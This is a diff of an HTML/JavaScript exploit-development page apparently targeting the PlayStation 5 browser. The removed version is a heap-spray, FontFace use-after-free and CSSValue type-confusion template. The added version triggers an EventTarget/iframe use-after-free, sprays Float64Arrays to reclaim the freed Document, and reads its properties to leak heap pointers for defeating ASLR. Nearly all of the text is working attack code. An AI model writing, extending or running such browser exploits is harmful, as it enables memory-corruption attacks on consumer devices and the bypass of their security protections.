@@ -2,316 +2,280 @@
 <html>
 <head>
 <meta charset="utf-8">
-<title>PS5 v62 — Universal Template (3-Way TC)</title>
-<style id="s">
-@font-face{font-family:prepad;src:url(np.woff);unicode-range:U+E123}
-@font-face{font-family:x;src:url(nx.woff);unicode-range:U+0042}
-*{margin:0;padding:0;box-sizing:border-box}
-html,body{width:100%;height:100%;background:#0a0a0a;color:#00ff41;
-font-family:'MS Gothic','Courier New',monospace;overflow:hidden}
-body::after{content:'';position:fixed;top:0;left:0;right:0;bottom:0;
-background:repeating-linear-gradient(0deg,rgba(0,0,0,0.12) 0px,rgba(0,0,0,0.12) 1px,transparent 1px,transparent 3px);
-pointer-events:none;z-index:9999}
-#hd{position:fixed;top:0;left:0;right:0;height:44px;
-background:linear-gradient(180deg,#0d0d0d,#080808);
-border-bottom:1px solid #00ff41;display:flex;align-items:center;
-padding:0 16px;gap:14px;z-index:10;font-size:12px}
-.l{color:#00ff41;letter-spacing:2px;font-weight:bold}
-.s{color:#004d13}.v{color:#00cc33}.v b{color:#00ff41}
-#pg{position:fixed;top:44px;left:0;right:0;height:2px;background:#001a06;z-index:10}
-#pg div{height:100%;background:#00ff41;transition:width .4s;box-shadow:0 0 8px #00ff41}
-#out{position:fixed;top:46px;left:0;right:0;bottom:0;
-padding:10px 14px;overflow-y:auto;font-size:13px;line-height:1.55;
--webkit-user-select:text}
-#out::-webkit-scrollbar{width:5px}
-#out::-webkit-scrollbar-track{background:#001a06}
-#out::-webkit-scrollbar-thumb{background:#004d13;border-radius:3px}
-.ok{color:#00ff41}.er{color:#ff3333}.wr{color:#ffcc00}.hl{color:#00ffff;font-weight:bold}
-.mg{color:#ff00ff;font-weight:bold;font-size:15px}.dm{color:#006622}
-.hd{color:#00ff41;font-weight:bold;font-size:14px;letter-spacing:1px}
+<title>PS5 v60 - Third Listener Info Leak</title>
+<style>
+body { background: #0a0a0a; color: #00ff41; font-family: monospace; padding: 20px; }
+button { display: block; width: 100%; padding: 15px; margin: 5px 0; font-size: 18px; background: #111; color: #00ff41; border: 1px solid #00ff41; cursor: pointer; }
+pre { white-space: pre-wrap; word-wrap: break-word; margin-top: 20px; }
+.ok { color: #00ff41 } .er { color: #ff3333 } .wr { color: #ffcc00 } .hl { color: #00ffff } .mg { color: #ff00ff; font-weight: bold }
 </style>
 </head>
 <body>
-<div id="hd">
-<span class="l">▶ v62 3-WAY TC</span><span class="s">│</span>
-<span class="v" id="h1">FW:<b>?</b></span><span class="s">│</span>
-<span class="v" id="h2">STAGE:<b>INIT</b></span>
-</div>
-<div id="pg"><div id="bar" style="width:0%"></div></div>
-<div id="out"></div>
+
+<h3>EventTarget UAF — Third Listener Info Leak</h3>
+<p>Click the button. The third listener executes AFTER the throw (after Document is freed).<br>
+If we see weird/corrupted values, we have a heap pointer leak.</p>
+
+<button onclick="triggerThirdListener()">Trigger UAF + Third Listener Read</button>
+
+<pre id="out"></pre>
+
 <script>
-"use strict";
+var out = document.getElementById("out");
+function log(m,c){var s=document.createElement("span");if(c)s.className=c;
+s.textContent=m+"\n";out.appendChild(s);out.scrollTop=out.scrollHeight}
 
-// ============================================================
-//  PS5 v62 — Universal Template + 3-Way Type Confusion
-// ============================================================
+log("=== EventTarget UAF — Third Listener Info Leak ===\n","mg");
 
-var O=document.getElementById("out");
-var bar=document.getElementById("bar");
-function pg(p){bar.style.width=p+"%"}
-function hu(id,v){var e=document.getElementById(id);if(e)e.innerHTML=v}
-function P(m,c){var s=document.createElement("span");if(c)s.className=c;
-s.textContent=m+"\n";O.appendChild(s);O.scrollTop=O.scrollHeight}
-function Ok(m){P("  ✅ "+m,"ok")}function Fl(m){P("  ✘ "+m,"er")}
-function Hi(m){P("  ► "+m,"hl")}function St(m){P("  ★ "+m+" ★","mg")}
-function Dm(m){P("  "+m,"dm")}function Wr(m){P("  ⚠ "+m,"wr")}
-function Hd(m){P("▸ "+m,"hd")}function Sep(){P("─".repeat(42),"dm")}
-
-window.onerror=function(m,s,l){Fl("CRASH: "+m.substring(0,80)+" @"+l);return true;};
-
-var ua=navigator.userAgent||"";
-var m=ua.match(/PlayStation\s*5\/?\s*([0-9]+(?:\.[0-9]+)?)/i);
-hu("h1","FW:<b>"+(m?m[1]:"?")+"</b>");
-
-P("════════════════════════════════════","hd");
-P("  v62 — 3-Way CSSValue Type Confusion","hd");
-P("════════════════════════════════════","hd");
-P("");
-
-// Base64 font data (from v46)
-var FB="d09GMgABAAAAAAJkAA4AAAAABiAAAAIQAAEAAAAAAAAAAAAAAAAAAAAAAAAAAAAAP0ZGVE0cGhwGYACCQggEEQgKcH0LCgABNgIkAxAEIAWEEAcyGy4FAI7Ctnlz5COJZMsihmWKh4f78Z573/0ZGIXRWLVZpRVNBz5LGmglcIJtH2hFs/L71vRPNg6FnRed2yOwAbJMJfRVCkhVAas6QCnP5701PYAm8AF8l8DegK66cR6mEGHAUS8K8ALFQCjz1m9GpK46tojEaUMI+PLzugVw1L1+g6Pdp10QoNuwKBKBQJW4q4V8mJ9xBx80vlmJDlJLBwDtADhxIz/D0Ya1YYmV/6ZePgIBgAmEBg1GEFgjBEZETYBSgpurYWj/ch78CyBaCUAkEgAQmj1O5W3E/1CCAu1o0I1+AIV5ERBV1dXSU+diLZ3nRV9OPep/9GPyZ/Ej398zrQyAl2Rh7bat/DBuWlu+rt026YeBG7HEWiTBtcafwuPKhODd1XFhmFr73R4rx+1LpKGZyEdolyDIR7hSoJlAAIAqpoBC8R6B0i5BIgS2SAC9niEApAChzzQCqc0uAo0ZFwhQ+vxCgBb9MYlAq744BSGqAxgjjBFIvVbQOKeKMuYfLSaEK7Yai2XguKmauX0HCg5t2NC0aubAChy/qmzUaj+jIBwDp8wtufXYHvxEVgIHtm05wG+yZ2mOGSQNC3Asy+sbTAq/FwbN6yCuJCftLedsSI0DzknNJsNUfOUqnng/9Fzes281/5JpNDqJaw3DWypomi41n5fDXAgJ/L/HCghqKARzIbLt1taqkzUt";
-var FBb=(function(){var s=atob(FB),b=new Uint8Array(s.length);
-for(var i=0;i<s.length;i++)b[i]=s.charCodeAt(i);return b})();
-function mkBuf(){var c=new Uint8Array(FBb.length);c.set(FBb);return c.buffer}
-function fs(){try{void document.body.offsetTop}catch(e){}}
-
-var sh=document.getElementById("s").sheet;
-var keep=[],holes=[],trigger=null,uafOk=false;
-
-// ============================================================
-// PHASE 1: UAF + CSSRule Spray
-// ============================================================
-
-pg(5);Hd("Creating holes...");
-for(var i=0;i<4096;i++){try{var f=new FontFace("h_"+i,mkBuf(),{
-unicodeRange:"U+E1"+(i%16).toString(16),style:i%2===0?"normal":"italic",
-weight:String(100+(i%9)*100)});document.fonts.add(f);holes.push(f)}catch(e){}}
-fs();for(var i=1;i<holes.length;i+=2)try{document.fonts.delete(holes[i])}catch(e){}
-fs();Ok("Holes ready: "+holes.length);
-
-pg(10);Hd("Trigger setup...");
-trigger=new FontFace("trigger","local(Helvetica)",{unicodeRange:"U+0041"});
-document.fonts.add(trigger);void trigger.loaded;
-for(var i=0;i<48;i++)try{sh.insertRule("@font-face{font-family:pad"+i+";src:url(np"+i+".woff);unicode-range:U+E000}",sh.cssRules.length)}catch(e){}
-fs();
-var fst=document.createElement("style");fst.id="flush";document.head.appendChild(fst);
-var fsh=fst.sheet;
-for(var i=0;i<768;i++)try{fsh.insertRule("@font-face{font-family:fl"+i+";src:url(nf"+i+".woff);unicode-range:U+E000}",fsh.cssRules.length)}catch(e){}
-fs();Ok("Trigger ready");
-
-pg(15);Hd("UAF + CSSRule Spray (A_0..A_2048)");
-
-Object.defineProperty(FontFace.prototype,"then",{configurable:true,
-get:function(){if(this===trigger&&!uafOk){uafOk=true;hu("h2","STAGE:<b>UAF</b>");
-St("UAF WINDOW OPEN");
-try{var ck=new FontFace("ck","local(Helvetica)",{unicodeRange:"U+E124"});
-document.fonts.add(ck);keep.push(ck);sh.deleteRule(1);fs();
-while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
-fs();for(var i=0;i<holes.length;i+=4)try{document.fonts.delete(holes[i])}catch(e){}
-fs()}catch(e){}
-Dm("GC pressure (16MB)...");
-for(var i=0;i<4;i++){var t=[];for(var j=0;j<128;j++)t.push(new ArrayBuffer(8192))}
-Dm("Spraying 2048 A_ faces...");
-for(var i=0;i<2048;i++){try{sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+(100+(i%9)*100)+";font-style:"+(i%2===0?"normal":"italic")+";unicode-range:U+0042}",sh.cssRules.length)}catch(e){}}
-fs();
-try{var d=document.createElement("div");d.textContent="AB";
-d.style.cssText="position:absolute;left:-9999px;font:64px trigger;";
-document.body.appendChild(d);void d.offsetWidth}catch(e){}
-Dm("UAF window closing");
-}return undefined}});
-
-var rn=0;var raf=function(){rn++;
-if(!uafOk&&rn>=5){try{if(sh&&sh.cssRules.length>1){sh.deleteRule(1);fs()}
-while(fsh.cssRules.length)try{fsh.deleteRule(0)}catch(e){}
-fs();for(var i=0;i<2048;i++){try{sh.insertRule("@font-face{font-family:A_"+i+";src:local(Courier);font-weight:"+(100+(i%9)*100)+";unicode-range:U+0042}",sh.cssRules.length)}catch(e){}}fs()}catch(e){}}
-if(rn<20)requestAnimationFrame(raf)};requestAnimationFrame(raf);
-
-// ============================================================
-// PHASE 2: Identify Confused Object
-// ============================================================
-
-pg(30);Sep();Hd("PHASE 2: Identify Confused Object");Sep();
-
-Dm("Calling load() — this is the ONLY load() call...");
-
-try {
-  document.fonts.load("1em trigger, x", "AB").then(function(faces){
-    P("  load() returned "+faces.length+" faces");
-    P("");
+function triggerThirdListener() {
+    log("\n[*] Starting third listener test...\n");
     
-    var aFamily = null;
-    var aFace = null;
+    var results = [];
     
-    for(var i=0;i<faces.length;i++){
-      var f=faces[i];
-      P("  Face["+i+"]: family="+f.family+" weight="+f.weight);
-      if(f.family&&f.family.indexOf("A_")===0){
-        aFamily = f.family;
-        aFace = f;
-      }
-    }
-    
-    if(!aFamily){
-      Fl("No A_ face found — spray failed");
-      hu("h2","STAGE:<b>FAIL</b>");
-      return;
-    }
-    
-    St("RECLAIMED: "+aFamily);
-    keep.push(faces);
-    keep.push(aFace);
-    
-    var aIndex = -1;
-    for(var i=0;i<sh.cssRules.length;i++){
-      try {
-        var r = sh.cssRules[i];
-        if(r.type === 5) {
-          var rf = r.style.getPropertyValue("font-family");
-          if(rf && rf.indexOf(aFamily) !== -1) {
-            aIndex = i;
-            break;
-          }
-        }
-      } catch(e) {}
-    }
-    
-    if(aIndex === -1){
-      Fl("Could not find CSSRule");
-      return;
-    }
-    
-    Ok("Found CSSRule at index "+aIndex);
-    var aStyle = sh.cssRules[aIndex].style;
-    
-    // Verify confusion
-    aStyle.setProperty("font-weight", "700");
-    fs();
-    var w = aFace.weight;
-    
-    if(String(w) !== "700"){
-      Fl("Confusion DEAD! Weight="+w);
-      return;
-    }
-    
-    Ok("Confusion ALIVE! Weight = 700 ✓");
-    P("");
-    
-    // ============================================================
-    // PHASE 3: 3-WAY TYPE CONFUSION TEST
-    // ============================================================
-    
-    pg(50);Sep();Hd("PHASE 3: 3-WAY TYPE CONFUSION TEST");Sep();
-    
-    var origFamily = aFace.family;
-    Dm("Original family: " + origFamily);
-    P("");
-    
-    // --- TEST 1: CSSCalcValue Spray ---
-    Hd("Test 1: CSSCalcValue Spray");
-    aStyle.setProperty("font-family", "FreeFam1");
-    fs();
-    Dm("Changed font-family to FreeFam1");
-    
-    var calcEls = [];
-    for (var i = 0; i < 2000; i++) {
-      var el = document.createElement('div');
-      el.style.width = 'calc(' + (i + 1) + 'px + ' + (i + 2) + 'px)';
-      document.body.appendChild(el);
-      calcEls.push(el);
-    }
-    fs();
-    
-    Dm("Reading font-family back...");
     try {
-      var readFam1 = aFace.family;
-      Hi("font-family read: " + readFam1);
-      if (readFam1 !== "FreeFam1" && readFam1 !== origFamily) {
-        St("TYPE CONFUSION DETECTED! (CalcValue)");
-        Hi("Leaked value: " + readFam1);
-      } else {
-        Wr("No confusion");
-      }
+        var f = document.body.appendChild(document.createElement('iframe'));
+        var a = document.createElement('div');
+        var b = a.appendChild(document.createElement('div'));
+        
+        log("[*] iframe created, document URL: " + f.contentDocument.URL);
+        
+        // ============================================================
+        // LISTENER 1: Free the Document + trigger GC
+        // ============================================================
+        a.addEventListener('a', function() {
+            log("[L1] Adopting node and removing iframe...");
+            document.adoptNode(a);
+            f.remove();
+            
+            // Force GC to free the Document
+            log("[L1] Forcing GC (32MB pressure)...");
+            for (var i = 0; i < 8; i++) {
+                var t = [];
+                for (var j = 0; j < 256; j++) t.push(new ArrayBuffer(65536));
+            }
+            
+            // Now spray with controlled data to reclaim the freed slot
+            // Use Float64Array with marker values
+            log("[L1] Spraying Float64Arrays to reclaim freed Document...");
+            var spray = [];
+            for (var i = 0; i < 1000; i++) {
+                var buf = new ArrayBuffer(256);
+                var f64 = new Float64Array(buf);
+                // Fill with marker pattern: 0xDEADBEEF + index
+                f64[0] = 1.1;  // Normal value
+                f64[1] = 2.2;
+                f64[2] = 3.3;
+                f64[3] = 4.4;
+                spray.push(f64);
+            }
+            log("[L1] Spray complete. 1000 Float64Arrays allocated.");
+            
+            // Now throw to continue to next listener
+            throw {
+                line: 1,
+                column: 1,
+                sourceURL: 'X'.repeat(1024 * 1024)  // Small spray (1MB)
+            };
+        });
+        
+        // ============================================================
+        // LISTENER 2: Buffer (catches the throw, continues dispatch)
+        // ============================================================
+        a.addEventListener('a', function() {
+            log("[L2] Buffer listener executed (after throw)");
+        });
+        
+        // ============================================================
+        // LISTENER 3: Read freed Document properties
+        // This executes AFTER the throw — Document should be freed
+        // Access via f.contentDocument (NOT savedDoc)
+        // ============================================================
+        a.addEventListener('a', function() {
+            log("[L3] Third listener executing — attempting to read freed Document...\n");
+            
+            var doc = null;
+            
+            // Try to access the freed Document via f.contentDocument
+            try {
+                doc = f.contentDocument;
+                if (doc) {
+                    log("[L3] f.contentDocument is NOT null! Address may be reused.","hl");
+                } else {
+                    log("[L3] f.contentDocument is null (expected if iframe removed)","dm");
+                }
+            } catch(e) {
+                log("[L3] f.contentDocument access error: " + e.message,"er");
+            }
+            
+            // If we got a document, try reading properties
+            if (doc) {
+                log("\n[L3] Reading Document properties...\n","hl");
+                
+                var props = [
+                    "nodeType", "nodeName", "URL", "title", "domain",
+                    "referrer", "cookie", "readyState", "compatMode",
+                    "characterSet", "contentType", "documentElement",
+                    "head", "body", "images", "links", "forms", "scripts",
+                    "styleSheets", "fonts", "implementation", "location",
+                    "defaultView", "activeElement", "currentScript",
+                    "visibilityState", "hidden", "fullscreenEnabled",
+                    "childElementCount", "firstElementChild", "lastElementChild"
+                ];
+                
+                for (var i = 0; i < props.length; i++) {
+                    try {
+                        var val = doc[props[i]];
+                        var str = String(val);
+                        
+                        // Check for unusual values
+                        var unusual = false;
+                        
+                        // Check if it's a number that looks like a pointer
+                        if (typeof val === "number" && val > 0x10000) {
+                            unusual = true;
+                            log("  [+] " + props[i] + " = " + val + " (0x" + val.toString(16) + ") ← POSSIBLE LEAK","hl");
+                        }
+                        // Check if string contains hex-like patterns
+                        else if (/[0-9a-f]{8,}/i.test(str) && str !== "[object HTMLDocument]") {
+                            unusual = true;
+                            log("  [+] " + props[i] + " = " + str + " ← UNUSUAL","hl");
+                        }
+                        // Check if value changed from expected defaults
+                        else if (props[i] === "nodeType" && val !== 9) {
+                            unusual = true;
+                            log("  [+] " + props[i] + " = " + val + " ← EXPECTED 9, GOT DIFFERENT","hl");
+                        }
+                        else if (props[i] === "URL" && val !== "about:blank") {
+                            unusual = true;
+                            log("  [+] " + props[i] + " = " + val + " ← EXPECTED about:blank","hl");
+                        }
+                        else if (props[i] === "readyState" && val !== "complete") {
+                            unusual = true;
+                            log("  [+] " + props[i] + " = " + val + " ← EXPECTED complete","hl");
+                        }
+                        else if (props[i] === "characterSet" && val !== "UTF-8") {
+                            unusual = true;
+                            log("  [+] " + props[i] + " = " + val + " ← EXPECTED UTF-8","hl");
+                        }
+                        else if (props[i] === "contentType" && val !== "text/html") {
+                            unusual = true;
+                            log("  [+] " + props[i] + " = " + val + " ← EXPECTED text/html","hl");
+                        }
+                        
+                        if (!unusual) {
+                            log("  [-] " + props[i] + " = " + str,"dm");
+                        }
+                        
+                        results.push({prop: props[i], value: val, unusual: unusual});
+                        
+                    } catch(e) {
+                        log("  [!] " + props[i] + " error: " + e.message,"er");
+                        results.push({prop: props[i], error: e.message, unusual: false});
+                    }
+                }
+                
+                // Try toString
+                log("\n[L3] toString checks:","hd");
+                try {
+                    var ts = doc.toString();
+                    log("  toString: " + ts);
+                    if (ts !== "[object HTMLDocument]") {
+                        log("  ← UNUSUAL toString!","hl");
+                    }
+                } catch(e) {
+                    log("  toString error: " + e.message,"er");
+                }
+                
+                // Try constructor
+                try {
+                    var ctor = doc.constructor;
+                    log("  constructor: " + ctor);
+                } catch(e) {
+                    log("  constructor error: " + e.message,"er");
+                }
+                
+                // Try JSON.stringify
+                try {
+                    var json = JSON.stringify(doc);
+                    log("  JSON: " + json);
+                } catch(e) {
+                    log("  JSON error: " + e.message);
+                }
+                
+                // Try Object.keys
+                try {
+                    var keys = Object.keys(doc);
+                    log("  Object.keys: " + keys.join(", "));
+                } catch(e) {
+                    log("  Object.keys error: " + e.message);
+                }
+                
+                // Try getOwnPropertyNames
+                try {
+                    var names = Object.getOwnPropertyNames(doc);
+                    log("  getOwnPropertyNames: " + names.join(", "));
+                } catch(e) {
+                    log("  getOwnPropertyNames error: " + e.message);
+                }
+                
+                // Try prototype
+                try {
+                    var proto = Object.getPrototypeOf(doc);
+                    log("  prototype: " + proto);
+                } catch(e) {
+                    log("  prototype error: " + e.message);
+                }
+                
+                // Try accessing internal slots via Reflect
+                try {
+                    var ownKeys = Reflect.ownKeys(doc);
+                    log("  Reflect.ownKeys: " + ownKeys.join(", "));
+                } catch(e) {
+                    log("  Reflect.ownKeys error: " + e.message);
+                }
+                
+            } else {
+                log("[L3] No document to read — trying alternative access methods...","wr");
+                
+                // Try accessing f directly
+                try {
+                    log("  f.tagName: " + f.tagName);
+                    log("  f.parentNode: " + (f.parentNode ? f.parentNode.nodeName : "null"));
+                    log("  f.contentWindow: " + f.contentWindow);
+                } catch(e) {
+                    log("  f access error: " + e.message,"er");
+                }
+            }
+            
+            // Summary
+            log("\n[L3] Summary:","hd");
+            var unusualCount = results.filter(function(r){return r.unusual}).length;
+            log("  Total properties checked: " + results.length);
+            log("  Unusual values found: " + unusualCount, unusualCount > 0 ? "hl" : "dm");
+            
+            if (unusualCount > 0) {
+                log("\n  ★ INFO LEAK DETECTED! ★","mg");
+                log("  Unusual values may contain heap pointers.","hl");
+                log("  These can be used to defeat ASLR.","hl");
+            } else {
+                log("\n  No unusual values detected.","dm");
+                log("  Document may not have been freed, or spray didn't land.","wr");
+            }
+            
+            log("\n=== Test Complete ===","mg");
+        });
+        
+        // Dispatch the event
+        log("[*] Dispatching event...\n");
+        b.dispatchEvent(new Event('a', { bubbles: true }));
+        
+        // Check if we survived
+        log("\n[+] Browser survived! No crash!","ok");
+        
     } catch(e) {
-      St("CRASH/ERROR: " + e.message);
+        log("\n[!] Exception: " + e.message,"er");
+        if (e.stack) log("  Stack: " + e.stack,"er");
     }
-    for (var el of calcEls) el.remove();
-    P("");
-    
-    // --- TEST 2: CSSPrimitiveValue Number Spray ---
-    Hd("Test 2: CSSPrimitiveValue Number Spray");
-    aStyle.setProperty("font-family", "FreeFam2");
-    fs();
-    Dm("Changed font-family to FreeFam2");
-    
-    var numEls = [];
-    for (var i = 0; i < 2000; i++) {
-      var el = document.createElement('div');
-      el.style.zIndex = String(i + 0x41414141);
-      document.body.appendChild(el);
-      numEls.push(el);
-    }
-    fs();
-    
-    Dm("Reading font-family back...");
-    try {
-      var readFam2 = aFace.family;
-      Hi("font-family read: " + readFam2);
-      if (readFam2 !== "FreeFam2" && readFam2 !== origFamily) {
-        St("TYPE CONFUSION DETECTED! (Number)");
-        Hi("Leaked value: " + readFam2);
-      } else {
-        Wr("No confusion");
-      }
-    } catch(e) {
-      St("CRASH/ERROR: " + e.message);
-    }
-    for (var el of numEls) el.remove();
-    P("");
-    
-    // --- TEST 3: CSSPrimitiveValue String Spray ---
-    Hd("Test 3: CSSPrimitiveValue String Spray");
-    aStyle.setProperty("font-family", "FreeFam3");
-    fs();
-    Dm("Changed font-family to FreeFam3");
-    
-    var strEls = [];
-    for (var i = 0; i < 2000; i++) {
-      var el = document.createElement('div');
-      el.style.counterReset = "sec" + i + " " + (i + 1);
-      document.body.appendChild(el);
-      strEls.push(el);
-    }
-    fs();
-    
-    Dm("Reading font-family back...");
-    try {
-      var readFam3 = aFace.family;
-      Hi("font-family read: " + readFam3);
-      if (readFam3 !== "FreeFam3" && readFam3 !== origFamily) {
-        St("TYPE CONFUSION DETECTED! (String)");
-        Hi("Leaked value: " + readFam3);
-      } else {
-        Wr("No confusion");
-      }
-    } catch(e) {
-      St("CRASH/ERROR: " + e.message);
-    }
-    for (var el of strEls) el.remove();
-    P("");
-    
-    // ============================================================
-    
-    pg(100);Sep();Hd("PHASE 4: Complete");Sep();
-    St("★ v62 COMPLETE ★");
-    hu("h2","STAGE:<b>DONE</b>");
-    
-  }).catch(function(e){
-    Fl("Load crashed: " + e.message);
-    hu("h2","STAGE:<b>CRASH</b>");
-  });
-} catch(e) {
-  Fl("Synchronous load() threw: " + e.message);
-  hu("h2","STAGE:<b>CRASH</b>");
 }
 </script>
 </body>
